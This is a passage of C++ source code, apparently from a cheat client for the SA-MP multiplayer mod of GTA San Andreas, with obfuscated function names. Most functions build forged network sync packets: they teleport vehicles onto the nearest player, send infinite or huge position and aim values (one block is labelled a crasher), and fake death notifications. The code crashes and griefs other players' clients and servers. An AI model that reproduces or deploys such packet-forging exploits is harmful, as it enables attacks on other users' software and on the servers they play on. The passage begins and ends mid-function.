		SendFakePassengedFullSyncData1(&vehSync, 0);
		cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());
		vect3_zero(vinfo->speed);

		v++;

	find_another_car:
		for (v; v < SAMP_VEHICLE_MAX; v++)
		{
			if (g_Vehicles->iIsListed[v] == 1)
				break;
		}

		if (v >= SAMP_VEHICLE_MAX)
			v = 0;


	}
}

void cheat_handle_pickmaasssssswqzzq141aa1112111qasaswewedffdll1212()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasasas17sdsddllsdssdere1212r == 1)
	{
		struct actor_info	*self = actor_info_get(ACTOR_SELF, 0);
		static int v = 0;

		if (g_Vehicles->iIsListed[v] != 1)
			goto find_another_car;

		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get(car_id, 0);

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}
		




		float fPos[3];
		vect3_copy(&self->base.matrix[4 * 3], fPos);

		// 1st version
		fPos[0] += (sinf(-self->fCurrentRotation) * 20.0f);
		fPos[1] += (cosf(-self->fCurrentRotation) * 20.0f);
		fPos[2] += 2.0f;

		float fSpeed[3] = { 0.0f, 0.0f, 0.0f };




		
		

		stUnoccupiedData vehSync;
		memset(&vehSync, 0, sizeof(stUnoccupiedData));

		vehSync.sVehicleID = iSAMPVehicleID;
		vehSync.fPosition[0] = fPos[0];
		vehSync.fPosition[1] = fPos[1];
		vehSync.fPosition[2] = fPos[2];
		vehSync.fHealth = vinfo->hitpoints;
		vehSync.fMoveSpeed[0] = fSpeed[0];
		vehSync.fMoveSpeed[1] = fSpeed[1];
		vehSync.fMoveSpeed[2] = fSpeed[2];
		
		SendFakeUnnocupiedFullSyncData1(&vehSync, 0);
		cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());
		//vect3_zero(vinfo->speed);
		vinfo->speed[0] = fSpeed[0];
		vinfo->speed[1] = fSpeed[1];
		vinfo->speed[2] = fSpeed[2];

		v++;

	find_another_car:
		for (v; v < SAMP_VEHICLE_MAX; v++)
		{
			if (g_Vehicles->iIsListed[v] == 1)
				break;
		}

		if (v >= SAMP_VEHICLE_MAX)
			v = 0;
			
		
	}
}

void cheat_handle_pickmaasssssswqzzq141aa1112111qasaswewedffdll121reer2()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasasas17sdsddllsdssdere1212rerer == 1)
	{
		struct actor_info	*self = actor_info_get(ACTOR_SELF, 0);
		static int v = 0;

		if (g_Vehicles->iIsListed[v] != 1)
			goto find_another_car;

		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get(car_id, 0);

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}





		float fPos[3];
		vect3_copy(&self->base.matrix[4 * 3], fPos);

		// 1st version
		float newpos[3] = { 999999.9, 1E07, 1E10 };
		fPos[0] += newpos[0];
		fPos[1] += newpos[1];
		fPos[2] += newpos[2];

		float fSpeed[3] = { 0.0f, 0.0f, 0.0f };







		stUnoccupiedData vehSync;
		memset(&vehSync, 0, sizeof(stUnoccupiedData));

		vehSync.sVehicleID = iSAMPVehicleID;
		vehSync.fPosition[0] = fPos[0];
		vehSync.fPosition[1] = fPos[1];
		vehSync.fPosition[2] = fPos[2];
		vehSync.fHealth = vinfo->hitpoints;
		vehSync.fMoveSpeed[0] = fSpeed[0];
		vehSync.fMoveSpeed[1] = fSpeed[1];
		vehSync.fMoveSpeed[2] = fSpeed[2];

		SendFakeUnnocupiedFullSyncData1(&vehSync, 0);
		cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());
		//vect3_zero(vinfo->speed);
		vinfo->speed[0] = fSpeed[0];
		vinfo->speed[1] = fSpeed[1];
		vinfo->speed[2] = fSpeed[2];

		v++;

	find_another_car:
		for (v; v < SAMP_VEHICLE_MAX; v++)
		{
			if (g_Vehicles->iIsListed[v] == 1)
				break;
		}

		if (v >= SAMP_VEHICLE_MAX)
			v = 0;


	}
}

void cheat_handle_pickmaasssssswqzzq141aa1112111qasaswewe()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasasas17sdsddserer == 1)
	{
		int					nearest_id = actor_find_nearest(ACTOR_ALIVE); 
		struct actor_info	*nearest;

		if (nearest_id == -1) return;
		if ((nearest = actor_info_get(nearest_id, ACTOR_ALIVE)) == NULL) return;



		static int v = 0;

		if (g_Vehicles->iIsListed[v] != 1)
		goto find_another_car;

		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get(car_id, 0);

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
		v++;
		goto find_another_car;
		}

		float fPos[3];
		vect3_copy(&nearest->base.matrix[4 * 3], fPos);

		//float fSpeed[3];
		//fSpeed[0] = sinf(fPos[0]) * 5;
		//fSpeed[1] = cosf(fPos[1]) * 5;
		//fSpeed[2] = cosf(fPos[1]) * 5;

		float fSpeed[3] = { 0.0f, 0.0f, 0.0f };

		INCAR_SYNC_DATA vehSync;
		memset(&vehSync, 0, sizeof(INCAR_SYNC_DATA));

		vehSync.VehicleID = iSAMPVehicleID;
		vehSync.vecPos[0] = fPos[0];
		vehSync.vecPos[1] = fPos[1];
		vehSync.vecPos[2] = fPos[2];
		vehSync.fCarHealth = vinfo->hitpoints;
		vehSync.vecMoveSpeed[0] = fSpeed[0];
		vehSync.vecMoveSpeed[1] = fSpeed[1];
		vehSync.vecMoveSpeed[2] = fSpeed[2];
		vehSync.wKeys = 0;
		vehSync.bytePlayerHealth = nearest->hitpoints;

		SendFakeDriverFullSyncData(&vehSync, 0);
		cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());
		vect3_zero(vinfo->speed);
		//vinfo->speed[0] = fSpeed[0];
		//vinfo->speed[1] = fSpeed[1];

		v++;

		find_another_car:
		for (v; v < SAMP_VEHICLE_MAX; v++)
		{
		if (g_Vehicles->iIsListed[v] == 1)
		break;
		}

		if (v >= SAMP_VEHICLE_MAX)
		v = 0;
	}
}



void cheat_handle_pickmaasssssswqzzq141aa1112111qasas()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasasas17sdsdds == 1)
	{
		int					nearest_id = actor_find_nearest(ACTOR_ALIVE);
		struct actor_info	*nearest;

		if (nearest_id == -1) return;
		if ((nearest = actor_info_get(nearest_id, ACTOR_ALIVE)) == NULL) return;

		

		static int v = 0;

		if (g_Vehicles->iIsListed[v] != 1)
			goto find_another_car;

		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get(car_id, 0);

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		float fPos[3];
		vect3_copy(&nearest->base.matrix[4 * 3], fPos);


		fPos[0] += -3 + rand() % 6;
		fPos[1] += -3 + rand() % 6;
		//fPos[2] += 20.0f;

		float fSpeed[3];
		fSpeed[0] = sinf(fPos[0]) * 5;
		fSpeed[1] = cosf(fPos[1]) * 5;


		//float fSpeed[3];
		//fSpeed[0] = sinf(fPos[0]) * 5;
		//fSpeed[1] = cosf(fPos[1]) * 5;
		//fSpeed[2] = cosf(fPos[1]) * 5;

		//float fSpeed[3] = { 0.0f, 0.0f, 0.0f };

		INCAR_SYNC_DATA vehSync;
		memset(&vehSync, 0, sizeof(INCAR_SYNC_DATA));

		vehSync.VehicleID = iSAMPVehicleID;
		vehSync.vecPos[0] = fPos[0];
		vehSync.vecPos[1] = fPos[1];
		vehSync.vecPos[2] = fPos[2];
		vehSync.fCarHealth = vinfo->hitpoints;
		vehSync.vecMoveSpeed[0] = fSpeed[0];
		vehSync.vecMoveSpeed[1] = fSpeed[1];
		vehSync.vecMoveSpeed[2] = fSpeed[2];
		vehSync.wKeys = 0;
		vehSync.bytePlayerHealth = nearest->hitpoints;

		SendFakeDriverFullSyncData(&vehSync, 0);
		cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());
		//vect3_zero(vinfo->speed);
		vinfo->speed[0] = fSpeed[0];
		vinfo->speed[1] = fSpeed[1];

		v++;

	find_another_car:
		for (v; v < SAMP_VEHICLE_MAX; v++)
		{
			if (g_Vehicles->iIsListed[v] == 1)
				break;
		}

		if (v >= SAMP_VEHICLE_MAX)
			v = 0;
	}
}


void cheat_handle_pickmaasssssswqzzq141aa1112111qasas5656ytty()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.pAAAfdfdfd == 1)
	{
		int					nearest_id = actor_find_nearest(ACTOR_ALIVE);
		struct actor_info	*nearest;

		if (nearest_id == -1) return;
		if ((nearest = actor_info_get(nearest_id, ACTOR_ALIVE)) == NULL) return;

		stOnFootData onSync;
		ZeroMemory(&onSync, sizeof(stOnFootData));

		onSync.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth;
		onSync.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;

		onSync.fPosition[0] = g_Players->pLocalPlayer->onFootData.fPosition[0];
		onSync.fPosition[1] = g_Players->pLocalPlayer->onFootData.fPosition[1];
		onSync.fPosition[2] = g_Players->pLocalPlayer->onFootData.fPosition[2];

		onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[0];
		onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[1];
		onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[2];

		float fPos[3];
		vect3_copy(&nearest->base.matrix[4 * 3], fPos);

		onSync.iCurrentAnimationID = 0x3C5;
		onSync.fPosition[0] = fPos[0];
		onSync.fPosition[1] = fPos[1];
		onSync.fPosition[2] = fPos[2] += -1;
		onSync.iCurrentAnimationID = 0x3C5;
		onSync.fQuaternion[0] = 0.50f;
		onSync.fQuaternion[1] = -0.50f;
		onSync.fQuaternion[2] = 0.50f;
		onSync.fQuaternion[3] = 0.50f;
		onSync.iCurrentAnimationID = 0x3C5;
		onSync.fMoveSpeed[2] = fPos[2] += 10.0f;
		onSync.iCurrentAnimationID = 0x3C5;

		 BitStream bsData;
		bsData.Write((BYTE)ID_PLAYER_SYNC);
		bsData.Write((PCHAR)&onSync, sizeof(stOnFootData));
		//for (int i = 0; i < 2; i++)
		g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
	}
}

void cheat_handle_pickmaasssssswqzzq141aa1112111qasas5656ytty3434()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.pAAAfdfdfderer == 1)
	{
		int					nearest_id = actor_find_nearest(ACTOR_ALIVE);
		struct actor_info	*nearest;

		if (nearest_id == -1) return;
		if ((nearest = actor_info_get(nearest_id, ACTOR_ALIVE)) == NULL) return;

		stOnFootData onSync;
		ZeroMemory(&onSync, sizeof(stOnFootData));

		onSync.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth;
		onSync.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;

		onSync.fPosition[0] = g_Players->pLocalPlayer->onFootData.fPosition[0];
		onSync.fPosition[1] = g_Players->pLocalPlayer->onFootData.fPosition[1];
		onSync.fPosition[2] = g_Players->pLocalPlayer->onFootData.fPosition[2];

		onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[0];
		onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[1];
		onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[2];

		float fPos[3];
		vect3_copy(&nearest->base.matrix[4 * 3], fPos);

		onSync.iCurrentAnimationID = 0x3C5;
		onSync.fPosition[0] = fPos[0];
		onSync.fPosition[1] = fPos[1];
		onSync.fPosition[2] = fPos[2] += -1;
		onSync.iCurrentAnimationID = 0x3C5;
		onSync.fQuaternion[0] = 0.50f;
		onSync.fQuaternion[1] = -0.50f;
		onSync.fQuaternion[2] = 0.50f;
		onSync.fQuaternion[3] = 0.50f;
		onSync.iCurrentAnimationID = 0x3C5;
		onSync.fMoveSpeed[2] = fPos[2] += 50.0f;
		onSync.iCurrentAnimationID = 0x3C5;

		 BitStream bsData;
		bsData.Write((BYTE)ID_PLAYER_SYNC);
		bsData.Write((PCHAR)&onSync, sizeof(stOnFootData));
		//for (int i = 0; i < 2; i++)
		g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
	}
}

void cheat_handle_pickmaasssssswqzzq141aa1112111qbbb()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasasas17bbb == 1)
	{
		
			stAimData aimSync;
			ZeroMemory(&aimSync, sizeof(stAimData));
			aimSync.fAimZ = g_Players->pLocalPlayer->aimData.fAimZ;
			aimSync.vecAimf1[0] = g_Players->pLocalPlayer->aimData.vecAimf1[0];
			aimSync.vecAimf1[1] = g_Players->pLocalPlayer->aimData.vecAimf1[1];
			aimSync.vecAimf1[2] = g_Players->pLocalPlayer->aimData.vecAimf1[2];
			aimSync.vecAimPos[0] = g_Players->pLocalPlayer->aimData.vecAimPos[0];
			aimSync.vecAimPos[1] = g_Players->pLocalPlayer->aimData.vecAimPos[1];
			aimSync.vecAimPos[2] = g_Players->pLocalPlayer->aimData.vecAimPos[2];
			aimSync.byteCamMode = g_Players->pLocalPlayer->aimData.byteCamMode;
			aimSync.byteCamExtZoom = g_Players->pLocalPlayer->aimData.byteCamExtZoom;
			aimSync.byteWeaponState = g_Players->pLocalPlayer->aimData.byteWeaponState;
			aimSync.bUnk = g_Players->pLocalPlayer->aimData.bUnk;

			aimSync.vecAimPos[2] = pow(300.f + random_float(0, 1), random_float(2, 15))*(int)random(-10, 10) * 3;
			aimSync.byteCamMode = 49;
			aimSync.byteWeaponState = WS_MORE_BULLETS;

			 BitStream bsData;
			bsData.Write((BYTE)ID_AIM_SYNC);
			bsData.Write((PCHAR)&aimSync, sizeof(stAimData));
			
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
		
	}
	return;
}

void cheat_handle_pickmaasssssswqzzq141aa1112111qbb()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasasas17bb == 1)
	{
		
			stAimData aimSync;
			ZeroMemory(&aimSync, sizeof(stAimData));
			aimSync.fAimZ = g_Players->pLocalPlayer->aimData.fAimZ;
			aimSync.vecAimf1[0] = g_Players->pLocalPlayer->aimData.vecAimf1[0];
			aimSync.vecAimf1[1] = g_Players->pLocalPlayer->aimData.vecAimf1[1];
			aimSync.vecAimf1[2] = g_Players->pLocalPlayer->aimData.vecAimf1[2];
			aimSync.vecAimPos[0] = g_Players->pLocalPlayer->aimData.vecAimPos[0];
			aimSync.vecAimPos[1] = g_Players->pLocalPlayer->aimData.vecAimPos[1];
			aimSync.vecAimPos[2] = g_Players->pLocalPlayer->aimData.vecAimPos[2];
			aimSync.byteCamMode = g_Players->pLocalPlayer->aimData.byteCamMode;
			aimSync.byteCamExtZoom = g_Players->pLocalPlayer->aimData.byteCamExtZoom;
			aimSync.byteWeaponState = g_Players->pLocalPlayer->aimData.byteWeaponState;
			aimSync.bUnk = g_Players->pLocalPlayer->aimData.bUnk;

			aimSync.vecAimPos[2] = pow(300.f + random_float(0, 1), random_float(2, 15))*(int)random(-10, 10) * 3;
			aimSync.byteCamMode = 65;
			aimSync.byteWeaponState = WS_MORE_BULLETS;

			 BitStream bsData;
			bsData.Write((BYTE)ID_AIM_SYNC);
			bsData.Write((PCHAR)&aimSync, sizeof(stAimData));
			
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
		
	}
	return;
}

void cheat_handle_pickmaasssssswqzzq141aa1112111qb()
{
	traceLastFunc("cheat_handle_pickmaab()");
	if (cheat_state->_generic.asasasas17b == 1)
	{
		
			stAimData aimSync;
			ZeroMemory(&aimSync, sizeof(stAimData));
			aimSync.fAimZ = g_Players->pLocalPlayer->aimData.fAimZ;
			aimSync.vecAimf1[0] = g_Players->pLocalPlayer->aimData.vecAimf1[0];
			aimSync.vecAimf1[1] = g_Players->pLocalPlayer->aimData.vecAimf1[1];
			aimSync.vecAimf1[2] = g_Players->pLocalPlayer->aimData.vecAimf1[2];
			aimSync.vecAimPos[0] = g_Players->pLocalPlayer->aimData.vecAimPos[0];
			aimSync.vecAimPos[1] = g_Players->pLocalPlayer->aimData.vecAimPos[1];
			aimSync.vecAimPos[2] = g_Players->pLocalPlayer->aimData.vecAimPos[2];
			aimSync.byteCamMode = g_Players->pLocalPlayer->aimData.byteCamMode;
			aimSync.byteCamExtZoom = g_Players->pLocalPlayer->aimData.byteCamExtZoom;
			aimSync.byteWeaponState = g_Players->pLocalPlayer->aimData.byteWeaponState;
			aimSync.bUnk = g_Players->pLocalPlayer->aimData.bUnk;

			aimSync.vecAimPos[2] = pow(300.f + random_float(0, 1), random_float(2, 15))*(int)random(-10, 10) * 3;
			aimSync.byteCamMode = 55;
			aimSync.byteWeaponState = WS_MORE_BULLETS;

			 BitStream bsData;
			bsData.Write((BYTE)ID_AIM_SYNC);
			bsData.Write((PCHAR)&aimSync, sizeof(stAimData));
			
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
		
	}
	return;
}





void cheat_handle_pickmaasssssswqzzq141aa1112111()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas14 == 1 )  
  {  
		struct actor_info *self = actor_info_get(-1, ACTOR_ALIVE);
		if(vehicle_info * vehicle = vehicle_info_get(VEHICLE_SELF,NULL))
		{
			CVehicle *pCurrentVehicle = pGameInterface->GetPools()->GetVehicle((DWORD *)vehicle_info_get(VEHICLE_SELF, 0));
			if(pCurrentVehicle)
			{
				CTaskSimpleCarSetPedOut* pOutTask = pGameInterface->GetTasks()->CreateTaskSimpleCarSetPedOut(pCurrentVehicle, 1, false);
				if(pOutTask)
				{
					self->fCurrentRotation = -pGame->GetCamera()->GetCameraRotation();
					self->fTargetRotation = self->fCurrentRotation;
					vehicle->base.matrix[4] = sinf(-self->fCurrentRotation);
					vehicle->base.matrix[5] = cosf(-self->fCurrentRotation);
					// May seem illogical, but it'll crash without this
					pOutTask->SetKnockedOffBike(); 

					pOutTask->ProcessPed(pPedSelf);
					pOutTask->SetIsWarpingPedOutOfCar ();
					pOutTask->Destroy();
				}
			}

			CVehicle *pVehicle = pGameInterface->GetPools()->GetVehicle((DWORD *)vehicle);
			if(pVehicle)
			{
				CTaskSimpleCarSetPedInAsDriver* pInTask = pGameInterface->GetTasks()->CreateTaskSimpleCarSetPedInAsDriver(pVehicle);
				if(pInTask)
				{
					pInTask->SetIsWarpingPedIntoCar();
					pInTask->ProcessPed(pPedSelf);
					pInTask->Destroy();
				}
			}
			pGameInterface->GetCamera()->RestoreWithJumpCut();
		}}
  return;
}



float vect2_dist(float * point1, float * point2)
{
	return sqrt(pow(point1[0] - point2[0], 2) + pow(point1[1] - point2[1], 2));
}


void cheat_handle_pickmaasssssswqzzq141aa11121111()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas15 == 1 )  
  { 
	static DWORD time = 0; 

		static bool state_of_weapon = false; 

		actor_info *actor = actor_info_get(ACTOR_SELF,NULL);	
	
		if(actor->weapon[2].id == 24 && actor->weapon[3].id == 25)
		{
			if ( g_Players->pLocalPlayer->onFootData.stSampKeys.keys_secondaryFire__shoot && ( g_Players->pLocalPlayer->onFootData.byteCurrentWeapon == 24 || 
				 g_Players->pLocalPlayer->onFootData.byteCurrentWeapon == 25 ))
			{
			
				if (GetTickCount() - 530 > time) 
				{ 
					
					if(state_of_weapon == false) 
					{ 
						 pPedSelf->SetCurrentWeaponSlot( eWeaponSlot (2) );  
						 state_of_weapon = true; 
						 time = GetTickCount(); 
					} 
					else 
					{ 
						if(state_of_weapon == true) 
						{ 
							pPedSelf->SetCurrentWeaponSlot( eWeaponSlot (3) );  
							state_of_weapon = false; 
							time = GetTickCount(); 
						} 	
					}
				}}}
			
  }
  return;
}

/* Fully Random  */

#define KK 100                     /* the int lag */
#define LL  37                     /* the short lag */
#define MM (1L<<30)                 /* the modulus */
#define mod_diff(x,y) (((x)-(y))&(MM-1)) /* subtraction mod MM */

unsigned int ran_arr_cycle();

unsigned int ran_x[KK];                    /* the generator state */

int rand0m(int min,int max)
{
	if(min == max)
		return min;
	return min + ran_arr_cycle() % (max-min);
}

unsigned int Rand(int min,int max)
{
	unsigned int res;
	_asm
	{
		RDTSC
		mul edx
		mov DWORD ptr[res], eax
	}
	return min + res % (max-min);
}

unsigned int r4nDs(unsigned int from, unsigned int to)
{
	if(from == 0 && to == 0)
		return 0;
	if(from == to)
		return from;
	return (ran_arr_cycle()%(to - from)) + from;
}

float r4ndom_fl0at(float low, float high)
{
	return low + (float)(r4nDs(0, 0xFFFFFF)) / ((float)(0xFFFFFF) / (high - low));
}


void ran_array(unsigned int aa[], unsigned int n)
{
	register int i, j;
	for (j = 0; j<KK; ++j) aa[j] = ran_x[j] + Rand(1, 100000);
	for (; j<n; ++j) aa[j] = mod_diff(aa[j - KK], aa[j - LL]);
	for (i = 0; i<LL; i++, j++) ran_x[i] = mod_diff(aa[j - KK], aa[j - LL]);
	for (; i<KK; i++, j++) ran_x[i] = mod_diff(aa[j - KK], ran_x[i - LL]);
}

/* the following routines are from exercise 3.6--15 */
/* after calling ran_start, get new randoms by, e.g., "x=ran_arr_next()" */

#define QUALITY 1009 /* recommended quality level for high-res use */
unsigned int ran_arr_buf[QUALITY];
unsigned int ran_arr_dummy=-1, ran_arr_started=-1;
unsigned int *ran_arr_ptr=&ran_arr_dummy; /* the next random number, or -1 */

#define TT  70   /* guaranteed separation between streams */
#define is_odd(x)  ((x)&1)          /* units bit of x */

void ran_start(int seed)
{
  register int t,j;
  unsigned int x[KK+KK-1];              /* the preparation buffer */
  register int ss=(seed+2)&(MM-2);
  for (j=0;j<KK;j++) {
    x[j]=ss;                      /* bootstrap the buffer */
    ss<<=1; if (ss>=MM) ss-=MM-2; /* cyclic shift 29 bits */
  }
  x[1]++;              /* make x[1] (and only x[1]) odd */
  for (ss=seed&(MM-1),t=TT-1; t; ) {       
    for (j=KK-1;j>0;j--) x[j+j]=x[j], x[j+j-1]=0; /* "square" */
    for (j=KK+KK-2;j>=KK;j--)
      x[j-(KK-LL)]=mod_diff(x[j-(KK-LL)],x[j]),
      x[j-KK]=mod_diff(x[j-KK],x[j]);
    if (is_odd(ss)) {              /* "multiply by z" */
      for (j=KK;j>0;j--)  x[j]=x[j-1];
      x[0]=x[KK];            /* shift the buffer cyclically */
      x[LL]=mod_diff(x[LL],x[KK]);
    }
    if (ss) ss>>=1; else t--;
  }
  for (j=0;j<LL;j++) ran_x[j+KK-LL]=x[j];
  for (;j<KK;j++) ran_x[j-LL]=x[j];
  for (j=0;j<10;j++) ran_array(x,KK+KK-1); /* warm things up */
  ran_arr_ptr=&ran_arr_started;
}

#define ran_arr_next() (*ran_arr_ptr>=0? *ran_arr_ptr++: ran_arr_cycle())
unsigned int ran_arr_cycle()
{
  if (ran_arr_ptr==&ran_arr_dummy)
    ran_start(314159L); /* the user forgot to initialize */
  ran_array(ran_arr_buf,QUALITY);
  ran_arr_buf[KK]=-1;
  ran_arr_ptr=ran_arr_buf+1;
  return ran_arr_buf[0];
}
//----//


//the trolling random :oo



int RandS(int min, int max)
{
   return (rand() % (max - min+1) + min);
}

double double_random(double a, double b) 
{
	return a + (b - a) * rand() / (RAND_MAX + 1);
} 








void cheat_handle_pickmaasssssswqzzq141aa111211111()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas16 == 1 )  
  { 
	  stAimData aimSync;
	  ZeroMemory(&aimSync, sizeof(stAimData));
	  aimSync.fAimZ = g_Players->pLocalPlayer->aimData.fAimZ;
	  aimSync.vecAimf1[0] = g_Players->pLocalPlayer->aimData.vecAimf1[0];
	  aimSync.vecAimf1[1] = g_Players->pLocalPlayer->aimData.vecAimf1[1];
	  aimSync.vecAimf1[2] = g_Players->pLocalPlayer->aimData.vecAimf1[2];
	  aimSync.vecAimPos[0] = g_Players->pLocalPlayer->aimData.vecAimPos[0];
	  aimSync.vecAimPos[1] = g_Players->pLocalPlayer->aimData.vecAimPos[1];
	  aimSync.vecAimPos[2] = g_Players->pLocalPlayer->aimData.vecAimPos[2];
	  aimSync.byteCamMode = g_Players->pLocalPlayer->aimData.byteCamMode;
	  aimSync.byteCamExtZoom = g_Players->pLocalPlayer->aimData.byteCamExtZoom;
	  aimSync.byteWeaponState = g_Players->pLocalPlayer->aimData.byteWeaponState;
	  aimSync.bUnk = g_Players->pLocalPlayer->aimData.bUnk;

	  aimSync.vecAimf1[0] = (float)0x7FFFFFFF;
	  aimSync.vecAimPos[0] = (float)0x7FFFFFFF;
	  aimSync.byteCamMode = 184;

	   BitStream bsData;
	  bsData.Write((BYTE)ID_AIM_SYNC);
	  bsData.Write((PCHAR)&aimSync, sizeof(stAimData));
	 
	  g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
	}
	}


 void cheat_handle_pickmaasssssswqzzq141aa11()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas10 == 1 )  
  {    
	SendWastedNotification(0, g_Players->sLocalPlayerID);
  }}

 void cheat_handle_pickmaasssssswqzzq141aa11mm()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas10mm == 1 )  
  {    
	SendWastedNotification(201, 1030);
  }}




 void cheat_handle_pickmaasssssswqzzq141aa11m()  
{  
  traceLastFunc( "cheat_handle_pickmaam()" );  
  if( cheat_state->_generic.asasasas10m == 1 )  
  {    
		static DWORD dwCrasherTick = GetTickCount();
	bool wrong_way = false;
	if (g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->pedFlags.bInVehicle)
	{
		int vehicleID = g_Players->pLocalPlayer->inCarData.sVehicleID;
		vehicle_info *vinfo = vehicle_info_get(VEHICLE_SELF, 0);
		if (!vinfo)
			return;
		//int class_id = gta_vehicle_get_by_id(vinfo->base.model_alt_id)->class_id;
		//if (class_id == VEHICLE_CLASS_AIRPLANE
			//|| vinfo->base.model_alt_id == 539)
		//{
			if (GetTickCount() - dwCrasherTick >= 1000)
			{
				stInCarData InCar;
				memcpy(&InCar, &g_Players->pLocalPlayer->inCarData, sizeof(stInCarData));
				InCar.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;
				float zero = 0;
				float infinito = 1 / zero;
				InCar.fPosition[2] = infinito;
				 BitStream bsInCar;
				bsInCar.Write((BYTE)ID_VEHICLE_SYNC);
				bsInCar.Write((PCHAR)&InCar, sizeof(stInCarData));
				g_DrifeitClient->Send(&bsInCar, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
				dwCrasherTick = GetTickCount();
			//}
		}}}}

 void cheat_handle_pickmaasssssswqzzq141aa11mq()  
{  
  traceLastFunc( "cheat_handle_pickmaam()" );  
  if( cheat_state->_generic.asasasas10mq == 1 )  
  {    
	  static int time = 0;
			if (GetTickCount() - 4000 > time)
			{
		
		stOnFootData onSync1;
			ZeroMemory(&onSync1, sizeof(stOnFootData)); 
			
			onSync1.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth; 
			onSync1.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;
			
			onSync1.fPosition[0] = g_Players->pLocalPlayer->onFootData.fPosition[0];
			onSync1.fPosition[1] = g_Players->pLocalPlayer->onFootData.fPosition[1];
			onSync1.fPosition[2] = g_Players->pLocalPlayer->onFootData.fPosition[2];
			
			onSync1.fMoveSpeed[0] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[0];
			onSync1.fMoveSpeed[1] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[1];
			onSync1.fMoveSpeed[2] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[2];
		
			onSync1.byteHealth = 99;
			
		
			 BitStream bsData2;
			bsData2.Write((BYTE)ID_PLAYER_SYNC);
			bsData2.Write((PCHAR)&onSync1,sizeof(stOnFootData));
			
			g_DrifeitClient->Send(&bsData2, SYSTEM_PRIORITY, UNRELIABLE, 0);

			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
